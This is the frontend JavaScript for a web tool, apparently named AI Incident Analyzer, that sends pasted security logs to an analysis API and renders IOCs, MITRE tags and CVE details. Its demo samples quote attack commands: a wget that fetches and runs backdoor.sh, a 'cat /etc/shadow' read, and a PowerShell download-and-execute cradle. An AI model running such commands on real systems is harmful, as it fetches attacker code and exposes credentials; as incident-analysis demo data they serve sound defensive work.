/* ===== AI Incident Analyzer — Frontend Logic ===== */

// --- Sample data for demo purposes ---
const SAMPLES = {
    phishing: `From: security-team@company.com
Subject: [ALERT] Suspicious Email Detected — Possible Phishing Campaign

Alert ID: PHI-2026-0401-001
Timestamp: 2026-04-01T08:23:17Z
Source: Email Security Gateway (Proofpoint)
Severity: HIGH

Details:
Multiple employees in the Finance department received emails from "accounts-payable@ch4se-bank.com"
with subject "Urgent: Wire Transfer Confirmation Required - Invoice #INV-98234"

Affected Users:
- jsmith@company.com (opened email, clicked link)
- mjones@company.com (opened email)
- klee@company.com (email quarantined)

Email Headers:
Return-Path: <bounce-7721@mail.suspicious-sender.ru>
Received: from mail.suspicious-sender.ru (185.234.72.19)
X-Mailer: PHPMailer 6.1.4
Reply-To: urgent-reply@protonmail.com

Embedded URL: hxxps://ch4se-bank-secure[.]com/verify?token=a8f3e2d1
URL redirects to: hxxps://185.234.72.19/harvest/login.php

Attachment: Wire_Transfer_Details.pdf.exe
SHA256: 3a7b9f2e8d1c4b6a5e0f7d8c9b2a1e3f4d5c6b7a8e9f0d1c2b3a4e5f6d7c8b9a

Network Activity (jsmith workstation):
POST to 185.234.72.19:443 at 08:25:02Z — 2.3KB sent
GET from 91.203.145.8:8080 at 08:25:14Z — downloaded payload.dll (415KB)
DNS query for c2-callback.darkops[.]net at 08:25:31Z`,

    bruteforce: `2026-04-01T02:14:03Z sshd[28412]: Failed password for admin from 203.0.113.42 port 44221 ssh2
2026-04-01T02:14:05Z sshd[28413]: Failed password for admin from 203.0.113.42 port 44225 ssh2
2026-04-01T02:14:07Z sshd[28414]: Failed password for root from 203.0.113.42 port 44228 ssh2
2026-04-01T02:14:08Z sshd[28415]: Failed password for admin from 203.0.113.42 port 44232 ssh2
2026-04-01T02:14:10Z sshd[28416]: Failed password for root from 203.0.113.42 port 44235 ssh2
2026-04-01T02:14:12Z sshd[28417]: Failed password for ubuntu from 203.0.113.42 port 44238 ssh2
2026-04-01T02:14:14Z sshd[28418]: Failed password for deploy from 203.0.113.42 port 44241 ssh2
2026-04-01T02:14:15Z sshd[28419]: Failed password for admin from 203.0.113.42 port 44244 ssh2
2026-04-01T02:14:17Z sshd[28420]: Failed password for root from 203.0.113.42 port 44247 ssh2
2026-04-01T02:14:19Z sshd[28421]: Accepted password for admin from 203.0.113.42 port 44250 ssh2
2026-04-01T02:14:19Z sshd[28421]: pam_unix(sshd:session): session opened for user admin
2026-04-01T02:15:01Z sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
2026-04-01T02:15:34Z bash[28501]: HISTORY: admin ran 'cat /etc/shadow'
2026-04-01T02:15:55Z bash[28502]: HISTORY: admin ran 'wget http://203.0.113.50/backdoor.sh -O /tmp/.hidden.sh'
2026-04-01T02:16:02Z bash[28503]: HISTORY: admin ran 'chmod +x /tmp/.hidden.sh && /tmp/.hidden.sh'
2026-04-01T02:16:30Z kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.42 DST=10.0.1.5 PROTO=TCP DPT=4444`,

    malware: `Alert: CrowdStrike Falcon — Malware Detection
Timestamp: 2026-04-01T11:42:08Z
Host: WORKSTATION-FIN07 (10.0.2.118)
User: dmiller
Detection: Malicious process execution detected

Process Chain:
1. OUTLOOK.EXE (PID 4812) → spawned
2. WINWORD.EXE (PID 5920) → spawned via macro
3. cmd.exe (PID 6104) → executed encoded PowerShell
4. powershell.exe (PID 6288) → decoded & executed payload

PowerShell Command (decoded):
IEX (New-Object Net.WebClient).DownloadString('hxxps://cdn-update[.]com/patch.ps1')

Downloaded Payload:
File: svchost_update.exe
Path: C:\\Users\\dmiller\\AppData\\Local\\Temp\\svchost_update.exe
MD5: d41d8cd98f00b204e9800998ecf8427e
SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069

Network Connections:
- Beacon to 198.51.100.23:443 every 60s (HTTPS)
- DNS TXT queries to data.exfil-dns[.]net (suspected data exfiltration)
- Connection to 198.51.100.50:8443 — downloaded additional module (rat_module.dll)

Registry Modifications:
- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate = "C:\\Users\\dmiller\\AppData\\Local\\Temp\\svchost_update.exe"

File System:
- Created: C:\\Users\\dmiller\\AppData\\Local\\Temp\\svchost_update.exe
- Created: C:\\Users\\dmiller\\AppData\\Roaming\\rat_module.dll
- Modified: C:\\Windows\\System32\\drivers\\etc\\hosts (added entry for cdn-update[.]com)

CVE Reference: CVE-2024-21413 (Microsoft Outlook remote code execution used for initial access)`
};


// --- State ---
let isAnalyzing = false;

// --- Init ---
document.addEventListener('DOMContentLoaded', () => {
    checkApiStatus();
    setupCharCount();
});


// --- API health check ---
async function checkApiStatus() {
    const dot = document.querySelector('.status-dot');
    const text = document.querySelector('.status-text');
    try {
        const resp = await fetch('/api/health');
        const data = await resp.json();
        if (data.api_configured) {
            dot.classList.add('online');
            text.textContent = 'AI Ready';
        } else {
            dot.classList.add('offline');
            text.textContent = 'API Key Not Set (Mock Mode)';
        }
    } catch {
        dot.classList.add('offline');
        text.textContent = 'Server Unreachable';
    }
}


// --- Character counter ---
function setupCharCount() {
    const input = document.getElementById('log-input');
    const counter = document.getElementById('char-count');
    input.addEventListener('input', () => {
        const len = input.value.length;
        counter.textContent = `${len.toLocaleString()} / 50,000`;
        counter.style.color = len > 50000 ? 'var(--severity-critical)' : 'var(--text-muted)';
    });
}


// --- Load sample data ---
function loadSample(type) {
    const input = document.getElementById('log-input');
    input.value = SAMPLES[type] || '';
    input.dispatchEvent(new Event('input'));
}


// --- Run analysis ---
async function runAnalysis() {
    if (isAnalyzing) return;

    const input = document.getElementById('log-input');
    const rawLogs = input.value.trim();

    if (!rawLogs) {
        showError('Please paste some log data or load a sample.');
        return;
    }
    if (rawLogs.length > 50000) {
        showError('Input exceeds the 50,000 character limit.');
        return;
    }

    setLoading(true);
    hideError();

    try {
        const resp = await fetch('/api/analyze', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ raw_logs: rawLogs }),
        });

        if (!resp.ok) {
            const err = await resp.json().catch(() => ({}));
            throw new Error(err.detail || `Server error (${resp.status})`);
        }

        const data = await resp.json();
        renderResults(data);

    } catch (err) {
        showError(err.message || 'Analysis failed. Check the console for details.');
        console.error('Analysis error:', err);
    } finally {
        setLoading(false);
    }
}


// --- Render results ---
function renderResults(data) {
    const panel = document.getElementById('results-panel');
    panel.style.display = 'flex';

    const c = data.classification;

    // Classification
    document.getElementById('incident-type').textContent = c.incident_type;
    document.getElementById('attack-vector').textContent = c.attack_vector;
    document.getElementById('summary').textContent = c.summary;
    document.getElementById('analysis-time').textContent = `${data.analysis_duration_ms}ms`;

    // Severity badge
    const badge = document.getElementById('severity-badge');
    badge.textContent = c.severity;
    badge.className = `severity-badge severity-${c.severity}`;

    // Confidence
    const pct = Math.round(c.confidence * 100);
    document.getElementById('confidence-bar').style.setProperty('--confidence', `${pct}%`);
    document.getElementById('confidence-pct').textContent = `${pct}%`;

    // IOCs
    renderIOCs(data.iocs);

    // MITRE
    renderTags('mitre-tactics', c.mitre_tactics, 'tag-mitre');
    renderTags('mitre-techniques', c.mitre_techniques, 'tag-mitre');

    // Assets
    renderTags('affected-assets', c.affected_assets, 'tag-asset');

    // CVE Details
    renderCVEs(data.cve_details || []);

    // CVE-IOC Correlations
    renderCorrelations(data.cve_correlations);

    // Scroll to results
    panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
}


// --- Render IOC groups ---
function renderIOCs(iocs) {
    const body = document.getElementById('ioc-body');
    body.innerHTML = '';

    const groups = [
        { label: 'IP Addresses', items: iocs.ip_addresses, type: 'ip' },
        { label: 'Domains', items: iocs.domains, type: 'domain' },
        { label: 'URLs', items: iocs.urls, type: 'url' },
        { label: 'Hashes', items: iocs.hashes, type: 'hash' },
        { label: 'Email Addresses', items: iocs.emails, type: 'email' },
        { label: 'Filenames', items: iocs.filenames, type: 'filename' },
        { label: 'CVEs', items: iocs.cves, type: 'cve' },
    ];

    let totalCount = 0;

    for (const group of groups) {
        if (!group.items || group.items.length === 0) continue;
        totalCount += group.items.length;

        const div = document.createElement('div');
        div.className = 'ioc-group';
        div.innerHTML = `<div class="ioc-group-label">${group.label} (${group.items.length})</div>`;

        const itemsWrap = document.createElement('div');
        for (const ioc of group.items) {
            const span = document.createElement('span');
            span.className = `ioc-item ioc-type-${group.type}`;
            span.innerHTML = `<span class="ioc-type-dot"></span>${escapeHtml(ioc.value)}`;
            itemsWrap.appendChild(span);
        }
        div.appendChild(itemsWrap);
        body.appendChild(div);
    }

    document.getElementById('ioc-total').textContent = `${totalCount} IOC${totalCount !== 1 ? 's' : ''}`;

    if (totalCount === 0) {
        body.innerHTML = '<p style="color:var(--text-muted);font-size:0.9rem;">No IOCs extracted from this input.</p>';
    }
}


// --- Render tag lists ---
function renderTags(elementId, items, tagClass) {
    const el = document.getElementById(elementId);
    if (!items || items.length === 0) {
        el.innerHTML = '<span style="color:var(--text-muted);font-size:0.85rem;">None identified</span>';
        return;
    }
    el.innerHTML = items.map(item =>
        `<span class="tag ${tagClass}">${escapeHtml(item)}</span>`
    ).join('');
}


// --- Render CVE details ---
function renderCVEs(cves) {
    const card = document.getElementById('cve-card');
    const body = document.getElementById('cve-body');

    if (!cves || cves.length === 0) {
        card.style.display = 'none';
        return;
    }

    card.style.display = 'block';
    document.getElementById('cve-total').textContent = `${cves.length} CVE${cves.length !== 1 ? 's' : ''}`;
    body.innerHTML = '';

    for (const cve of cves) {
        const div = document.createElement('div');
        div.className = 'cve-entry';

        // Header row: CVE ID + CVSS badge
        let cvssHtml = '';
        if (cve.cvss_score !== null && cve.cvss_score !== undefined) {
            const sevClass = (cve.cvss_severity || 'MEDIUM').toUpperCase();
            cvssHtml = `
                <div class="cvss-badge cvss-${sevClass}">
                    <span class="cvss-score">${cve.cvss_score}</span>
                    <span class="cvss-label">${sevClass}</span>
                </div>`;
        }

        // Exploited warning
        let exploitedHtml = '';
        if (cve.known_exploited) {
            exploitedHtml = '<div class="cve-exploited-warn">⚠ Known Exploited Vulnerability</div>';
        }

        // Attack details
        let attackDetailsHtml = '';
        const details = [];
        if (cve.attack_vector) details.push(`<span class="cve-detail-item"><strong>Vector:</strong> ${escapeHtml(cve.attack_vector)}</span>`);
        if (cve.attack_complexity) details.push(`<span class="cve-detail-item"><strong>Complexity:</strong> ${escapeHtml(cve.attack_complexity)}</span>`);
        if (cve.privileges_required) details.push(`<span class="cve-detail-item"><strong>Privileges:</strong> ${escapeHtml(cve.privileges_required)}</span>`);
        if (cve.user_interaction) details.push(`<span class="cve-detail-item"><strong>User Interaction:</strong> ${escapeHtml(cve.user_interaction)}</span>`);
        if (details.length > 0) {
            attackDetailsHtml = `<div class="cve-attack-details">${details.join('')}</div>`;
        }

        // Affected products
        let productsHtml = '';
        if (cve.affected_products && cve.affected_products.length > 0) {
            const tags = cve.affected_products.map(p => `<span class="tag tag-product">${escapeHtml(p)}</span>`).join('');
            productsHtml = `
                <div class="cve-section">
                    <label>Affected Products</label>
                    <div class="tag-list">${tags}</div>
                </div>`;
        }

        // Weaknesses
        let weaknessHtml = '';
        if (cve.weaknesses && cve.weaknesses.length > 0) {
            const tags = cve.weaknesses.map(w => `<span class="tag tag-cwe">${escapeHtml(w)}</span>`).join('');
            weaknessHtml = `
                <div class="cve-section">
                    <label>Weaknesses</label>
                    <div class="tag-list">${tags}</div>
                </div>`;
        }

        // References
        let refsHtml = '';
        if (cve.references && cve.references.length > 0) {
            const links = cve.references.slice(0, 5).map(url => {
                const domain = new URL(url).hostname;
                return `<a href="${escapeHtml(url)}" target="_blank" rel="noopener" class="cve-ref-link">${escapeHtml(domain)}</a>`;
            }).join('');
            refsHtml = `
                <div class="cve-section">
                    <label>References</label>
                    <div class="cve-refs">${links}</div>
                </div>`;
        }

        div.innerHTML = `
            <div class="cve-header">
                <div class="cve-id-row">
                    <span class="cve-id">${escapeHtml(cve.cve_id)}</span>
                    ${cve.published_date ? `<span class="cve-date">Published ${escapeHtml(cve.published_date)}</span>` : ''}
                </div>
                ${cvssHtml}
            </div>
            ${exploitedHtml}
            <p class="cve-description">${escapeHtml(cve.description)}</p>
            ${attackDetailsHtml}
            ${productsHtml}
            ${weaknessHtml}
            ${refsHtml}
        `;

        body.appendChild(div);
    }
}


// --- Render CVE-IOC correlations ---
function renderCorrelations(correlationData) {
    const card = document.getElementById('correlation-card');
    const body = document.getElementById('correlation-body');
    const summary = document.getElementById('correlation-summary');

    if (!correlationData || !correlationData.correlations || correlationData.correlations.length === 0) {
        card.style.display = 'none';
        return;
    }

    card.style.display = 'block';
    const corrs = correlationData.correlations;
    document.getElementById('correlation-total').textContent = `${corrs.length} link${corrs.length !== 1 ? 's' : ''}`;
    summary.textContent = correlationData.summary || '';
    body.innerHTML = '';

    // Group by CVE
    const grouped = {};
    for (const c of corrs) {
        if (!grouped[c.cve_id]) grouped[c.cve_id] = [];
        grouped[c.cve_id].push(c);
    }

    for (const [cveId, items] of Object.entries(grouped)) {
        const group = document.createElement('div');
        group.className = 'corr-group';
        group.innerHTML = `<div class="corr-group-label">${escapeHtml(cveId)}</div>`;

        const table = document.createElement('div');
        table.className = 'corr-table';

        for (const item of items) {
            const row = document.createElement('div');
            row.className = 'corr-row';

            const confClass = item.confidence.toLowerCase();
            row.innerHTML = `
                <div class="corr-ioc">
                    <span class="corr-ioc-type">${escapeHtml(item.ioc_type.toUpperCase())}</span>
                    <span class="corr-ioc-value">${escapeHtml(item.ioc_value)}</span>
                </div>
                <div class="corr-meta">
                    <span class="corr-reason">${escapeHtml(item.reason)}</span>
                    <span class="corr-confidence corr-conf-${confClass}">${escapeHtml(item.confidence)}</span>
                </div>
            `;
            table.appendChild(row);
        }

        group.appendChild(table);
        body.appendChild(group);
    }
}


// --- UI helpers ---
function setLoading(loading) {
    isAnalyzing = loading;
    const btn = document.getElementById('analyze-btn');
    const btnText = btn.querySelector('.btn-text');
    const btnLoader = btn.querySelector('.btn-loader');
    btn.disabled = loading;
    btnText.style.display = loading ? 'none' : 'inline';
    btnLoader.style.display = loading ? 'inline-flex' : 'none';
}

function showError(msg) {
    const banner = document.getElementById('error-banner');
    document.getElementById('error-message').textContent = msg;
    banner.style.display = 'flex';
}

function hideError() {
    document.getElementById('error-banner').style.display = 'none';
}

function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}
